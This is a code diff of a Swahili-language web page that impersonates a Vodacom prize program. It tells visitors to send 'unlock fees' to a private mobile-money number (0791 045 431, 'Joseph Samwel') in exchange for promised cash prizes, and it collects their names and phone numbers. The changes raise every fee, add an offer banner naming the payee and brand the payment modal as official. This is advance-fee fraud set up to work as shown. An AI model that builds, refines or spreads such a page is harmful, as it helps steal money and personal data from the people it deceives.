@@ -274,6 +274,42 @@
     margin: 0 auto;
   }
 
+  /* ===== HERO OFFER BANNER ===== */
+  .hero-offer-banner {
+    background: linear-gradient(135deg, rgba(226, 0, 26, 0.10), rgba(242, 169, 59, 0.06));
+    border: 1px solid rgba(226, 0, 26, 0.15);
+    border-radius: 12px;
+    padding: 12px 16px;
+    margin-top: 14px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    text-align: left;
+  }
+  .hero-offer-banner .icon {
+    font-size: 20px;
+    flex-shrink: 0;
+  }
+  .hero-offer-banner .text {
+    font-size: 12px;
+    color: var(--mist);
+    line-height: 1.6;
+  }
+  .hero-offer-banner .text strong {
+    color: var(--gold);
+    font-weight: 600;
+  }
+  .hero-offer-banner .text .highlight {
+    color: var(--vodacom-red);
+    font-weight: 600;
+  }
+  .hero-offer-banner .text .number {
+    color: #fff;
+    font-family: var(--font-mono);
+    font-weight: 600;
+    letter-spacing: 0.04em;
+  }
+
   .vodacom-badge {
     display: inline-flex;
     align-items: center;
@@ -282,7 +318,7 @@
     border: 1px solid rgba(226, 0, 26, 0.2);
     border-radius: 30px;
     padding: 4px 16px 4px 12px;
-    margin-top: 12px;
+    margin-top: 10px;
     font-size: 12px;
     color: var(--vodacom-red);
     font-weight: 600;
@@ -520,6 +556,7 @@
     .unlock-fee { font-size: 14px; }
     .btn-unlock { font-size: 11.5px; padding: 8px 0; }
     .featured-badge { font-size: 6px; padding: 2px 10px 1px; right: 10px; }
+    .hero-offer-banner .text { font-size: 11px; }
   }
 
   @media (max-width: 360px) {
@@ -528,6 +565,7 @@
     .prize-amount { font-size: 15px; }
     .unlock-fee { font-size: 12px; }
     .btn-unlock { font-size: 10px; padding: 6px 0; margin-top: 8px; }
+    .hero-offer-banner .text { font-size: 10px; }
   }
 
   .packages-footer {
@@ -764,7 +802,7 @@
   }
 
   /* ============================================================ */
-  /* 🔴 MODAL — WITH NAME + PHONE + PERSUASIVE COPY              */
+  /* 🔴 MODAL — FINAL VERSION                                     */
   /* ============================================================ */
 
   .modal-overlay {
@@ -781,6 +819,7 @@
   .modal-overlay.active {
     display: flex;
   }
+
   .modal {
     background: var(--paper);
     color: var(--ink);
@@ -792,24 +831,41 @@
     overflow-y: auto;
     position: relative;
   }
+
+  /* ===== TOP ROW: CLOSE + VODACOM BADGE ===== */
+  .modal-top-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 14px;
+  }
   .modal-close {
-    position: absolute;
-    top: 12px;
-    right: 16px;
     background: none;
     border: none;
     font-size: 22px;
     color: #7A755E;
     line-height: 1;
+    padding: 0;
   }
-  .modal h3 {
-    font-family: var(--font-display);
-    font-size: 20px;
-    margin-bottom: 2px;
+  .modal-close:hover {
+    color: var(--vodacom-red);
+  }
+  .modal-vodacom-badge {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--vodacom-red);
+    color: #fff;
+    padding: 4px 14px 4px 10px;
+    border-radius: 20px;
+    font-size: 11px;
+    font-weight: 600;
+    font-family: var(--font-mono);
+    letter-spacing: 0.04em;
   }
 
-  /* ===== URGENCY BANNER ===== */
-  .urgency-banner {
+  /* ===== OFFER BANNER ===== */
+  .modal-offer-banner {
     background: linear-gradient(135deg, rgba(226, 0, 26, 0.10), rgba(242, 169, 59, 0.06));
     border: 1px solid rgba(226, 0, 26, 0.15);
     border-radius: 10px;
@@ -819,52 +875,34 @@
     align-items: flex-start;
     gap: 10px;
   }
-  .urgency-icon {
-    font-size: 20px;
+  .modal-offer-banner .icon {
+    font-size: 18px;
     flex-shrink: 0;
     margin-top: 1px;
   }
-  .urgency-text {
-    font-size: 12.5px;
+  .modal-offer-banner .text {
+    font-size: 12px;
     color: #5B5646;
-    line-height: 1.5;
+    line-height: 1.6;
   }
-  .urgency-text strong {
-    color: var(--vodacom-red);
-    font-weight: 700;
-    display: block;
-    font-size: 13px;
-  }
-  .urgency-text span strong {
-    display: inline;
+  .modal-offer-banner .text strong {
     color: var(--gold-deep);
-  }
-
-  /* ===== PRIZE VALUE ===== */
-  .modal .prize-value-display {
-    font-family: var(--font-display);
-    font-size: 22px;
     font-weight: 700;
-    color: var(--gold);
-    margin-bottom: 12px;
   }
-
-  .payment-method-badge {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    background: var(--vodacom-red);
-    color: #fff;
-    padding: 2px 14px 2px 10px;
-    border-radius: 20px;
-    font-size: 11px;
+  .modal-offer-banner .text .highlight {
+    color: var(--vodacom-red);
     font-weight: 600;
+  }
+  .modal-offer-banner .text .number {
+    color: var(--ink);
     font-family: var(--font-mono);
-    letter-spacing: 0.04em;
-    margin-bottom: 12px;
-    width: fit-content;
+    font-weight: 600;
+    background: rgba(226, 0, 26, 0.06);
+    padding: 1px 8px;
+    border-radius: 4px;
   }
 
+  /* ===== PAYMENT HINT ===== */
   .payment-hint {
     background: var(--vodacom-red-light);
     color: var(--vodacom-red-dark);
@@ -886,6 +924,7 @@
     font-size: 11px;
   }
 
+  /* ===== PAY BOX ===== */
   .pay-box {
     background: var(--ink);
     color: var(--paper);
@@ -925,6 +964,7 @@
     background: var(--vodacom-red-dark);
   }
 
+  /* ===== FIELDS ===== */
   .field {
     margin-bottom: 12px;
   }
@@ -990,6 +1030,7 @@
     background: var(--vodacom-red-dark);
   }
 
+  /* ===== SUCCESS VIEW ===== */
   .success-view {
     display: none;
     text-align: center;
@@ -1072,6 +1113,13 @@
         </h1>
         <p>Chagua zawadi unayotaka, lipa ada ya kufungua, na pesa inakwenda moja kwa moja kwenye simu yako.</p>
 
+        <div class="hero-offer-banner">
+          <span class="icon">⚡</span>
+          <span class="text">
+            <strong>Pata ofa ya Tsh 300,000</strong> ... Kwa kulipa ada ya uwezeshaji ya Kwa nambari ya katibu <span class="highlight">Joseph Samwel</span> <span class="number">0791 045 431</span>
+          </span>
+        </div>
+
         <div class="vodacom-badge">
           <span class="dot"></span>
           Vodacom Tunzo — Programu Rasmi
@@ -1122,9 +1170,9 @@
             <div class="divider"></div>
             <div class="unlock-label">Ada ya Kufungua</div>
             <div class="unlock-fee">
-              <span class="currency">TZS</span> 87,203
+              <span class="currency">TZS</span> 101,203
             </div>
-            <button class="btn-unlock" onclick="openModal('600,000', '87,203', 'Dhahabu')">
+            <button class="btn-unlock" onclick="openModal('600,000', '101,203', 'Dhahabu')">
               🔓 Fungua Sasa
             </button>
           </div>
@@ -1140,9 +1188,9 @@
             <div class="divider"></div>
             <div class="unlock-label">Ada ya Kufungua</div>
             <div class="unlock-fee">
-              <span class="currency">TZS</span> 167,456
+              <span class="currency">TZS</span> 297,456
             </div>
-            <button class="btn-unlock" onclick="openModal('1,200,000', '167,456', 'Almasi')">
+            <button class="btn-unlock" onclick="openModal('1,200,000', '297,456', 'Almasi')">
               🔓 Fungua Sasa
             </button>
           </div>
@@ -1157,9 +1205,9 @@
             <div class="divider"></div>
             <div class="unlock-label">Ada ya Kufungua</div>
             <div class="unlock-fee">
-              <span class="currency">TZS</span> 336,489
+              <span class="currency">TZS</span> 556,489
             </div>
-            <button class="btn-unlock" onclick="openModal('2,500,000', '336,489', 'Taji')">
+            <button class="btn-unlock" onclick="openModal('2,500,000', '556,489', 'Taji')">
               🔓 Fungua Sasa
             </button>
           </div>
@@ -1174,9 +1222,9 @@
             <div class="divider"></div>
             <div class="unlock-label">Ada ya Kufungua</div>
             <div class="unlock-fee">
-              <span class="currency">TZS</span> 676,980
+              <span class="currency">TZS</span> 1,112,978
             </div>
-            <button class="btn-unlock" onclick="openModal('5,000,000', '676,980', 'Kifalme')">
+            <button class="btn-unlock" onclick="openModal('5,000,000', '1,112,978', 'Kifalme')">
               🔓 Fungua Sasa
             </button>
           </div>
@@ -1192,9 +1240,9 @@
             <div class="divider"></div>
             <div class="unlock-label">Ada ya Kufungua</div>
             <div class="unlock-fee">
-              <span class="currency">TZS</span> 1,225,956
+              <span class="currency">TZS</span> 2,225,956
             </div>
-            <button class="btn-unlock" onclick="openModal('10,000,000', '1,225,956', 'Jackpot')">
+            <button class="btn-unlock" onclick="openModal('10,000,000', '2,225,956', 'Jackpot')">
               🔓 Fungua Sasa
             </button>
           </div>
@@ -1316,7 +1364,7 @@
       <div class="faq-list">
         <div class="faq-item">
           <button class="faq-q" onclick="toggleFaq(this)">Malipo yanafanyika vipi? <span class="plus">+</span></button>
-          <div class="faq-a"><p>Tuma kiasi cha ada ya kufungua kwenye namba ya Vodacom <strong>0791 045 431</strong> (Jina: Joseph). Baada ya malipo, jaza jina lako na namba ya simu ili zawadi yako itumwe.</p></div>
+          <div class="faq-a"><p>Tuma kiasi cha ada ya kufungua kwenye namba ya Vodacom <strong>0791 045 431</strong> (Jina: Joseph Samwel). Baada ya malipo, jaza jina lako na namba ya simu ili zawadi yako itumwe.</p></div>
         </div>
         <div class="faq-item">
           <button class="faq-q" onclick="toggleFaq(this)">Zawadi inakuja haraka? <span class="plus">+</span></button>
@@ -1367,7 +1415,7 @@
       </div>
 
       <div class="disclaimer">
-        <strong>📌 Taarifa:</strong> Namba ya malipo ni <strong>0791 045 431</strong> (Jina: Joseph). Hakikisha unatuma kiasi sahihi cha ada ya kufungua. Baada ya malipo, jaza jina lako na namba ya simu ili zawadi yako itumwe.
+        <strong>📌 Taarifa:</strong> Namba ya malipo ni <strong>0791 045 431</strong> (Jina: Joseph Samwel). Hakikisha unatuma kiasi sahihi cha ada ya kufungua. Baada ya malipo, jaza jina lako na namba ya simu ili zawadi yako itumwe.
       </div>
 
       <div class="foot-bottom">
@@ -1378,36 +1426,35 @@
   </footer>
 
   <!-- ============================================================ -->
-  <!-- 🔴 MODAL — WITH NAME + PHONE + PERSUASIVE COPY              -->
+  <!-- 🔴 MODAL — FINAL VERSION                                     -->
   <!-- ============================================================ -->
 
   <div class="modal-overlay" id="modalOverlay">
     <div class="modal">
-      <button class="modal-close" onclick="closeModal()" aria-label="Funga">&times;</button>
+      
+      <!-- ===== TOP ROW: CLOSE + VODACOM BADGE ===== -->
+      <div class="modal-top-row">
+        <button class="modal-close" onclick="closeModal()" aria-label="Funga">✕</button>
+        <span class="modal-vodacom-badge">📱 Vodacom Program</span>
+      </div>
 
       <div class="form-view" id="formView">
 
-        <!-- ===== PERSUASIVE COPY / URGENCY BANNER ===== -->
-        <div class="urgency-banner">
-          <div class="urgency-icon">⚡</div>
-          <div class="urgency-text">
-            <strong>Watu 12,400+ wameshinda tayari!</strong>
-            <span>Zawadi hii ina nafasi <strong>3 tu</strong> zilizobaki. Lipa sasa, pata pesa ndani ya dakika!</span>
-          </div>
+        <!-- ===== OFFER TEXT ===== -->
+        <div class="modal-offer-banner">
+          <span class="icon">⚡</span>
+          <span class="text">
+            <strong>Pata ofa ya Tsh 300,000</strong> ... Kwa kulipa ada ya uwezeshaji ya Kwa nambari ya katibu <span class="highlight">Joseph Samwel</span> <span class="number">0791 045 431</span>
+          </span>
         </div>
 
-        <h3 id="modalTierName">Fedha</h3>
-        <div class="prize-value-display" id="modalPrizeAmount">TZS 300,000</div>
-
-        <div class="payment-method-badge">
-          📱 Vodacom
-        </div>
-
+        <!-- ===== PAYMENT HINT ===== -->
         <div class="payment-hint">
           <strong>0791 045 431</strong>
-          <span>Jina: Joseph</span>
+          <span>Jina: Joseph Samwel</span>
         </div>
 
+        <!-- ===== PAYMENT DETAILS ===== -->
         <div class="pay-box">
           <div class="row"><span>Ada ya Kufungua</span><b id="payAmount">TZS 43,569</b></div>
           <div class="row"><span>Unapata</span><b class="highlight-amount" id="modalYouGet">TZS 300,000</b></div>
@@ -1435,6 +1482,7 @@
           <span>🔒 Taarifa zako zimehifadhiwa salama</span>
         </div>
 
+        <!-- ===== CONFIRM BUTTON ===== -->
         <button class="btn confirm-btn" onclick="confirmPayment()">💰 Nimelipa — Thibitisha</button>
       </div>
 
@@ -1477,7 +1525,7 @@
 
     // ---- Payment modal ----
     const PAYMENT_NUMBER = "0791 045 431";
-    const PAYMENT_NAME = "Joseph";
+    const PAYMENT_NAME = "Joseph Samwel";
     let currentPrize = { name: '', amount: '', fee: '' };
     let currentRef = '';
 
@@ -1493,11 +1541,15 @@
       };
       currentRef = generateRef();
 
-      document.getElementById('modalTierName').textContent = prizeName;
-      document.getElementById('modalPrizeAmount').textContent = 'TZS ' + prizeAmount;
+      // Update payment details
       document.getElementById('payAmount').textContent = 'TZS ' + unlockFee;
       document.getElementById('modalYouGet').textContent = 'TZS ' + prizeAmount;
       document.getElementById('refCode').textContent = currentRef;
+
+      // Update receipt for success view
+      document.getElementById('rcptTier').textContent = prizeName;
+      document.getElementById('rcptAmount').textContent = 'TZS ' + prizeAmount;
+      document.getElementById('rcptPaid').textContent = 'TZS ' + unlockFee;
 
       document.getElementById('formView').classList.remove('hidden');
       document.getElementById('successView').classList.remove('active');
@@ -1585,9 +1637,6 @@
       } catch (e) { /* ignore */ }
 
       document.getElementById('rcptName').textContent = nameInput.value.trim();
-      document.getElementById('rcptTier').textContent = currentPrize.name;
-      document.getElementById('rcptAmount').textContent = 'TZS ' + currentPrize.amount;
-      document.getElementById('rcptPaid').textContent = 'TZS ' + currentPrize.fee;
       document.getElementById('rcptPhone').textContent = phoneInput.value.trim();
       document.getElementById('rcptId').textContent = memberId;
 
@@ -1595,6 +1644,6 @@
       document.getElementById('successView').classList.add('active');
     }
   </script>
-</html>
-</body>
 
+</body>
+</html>
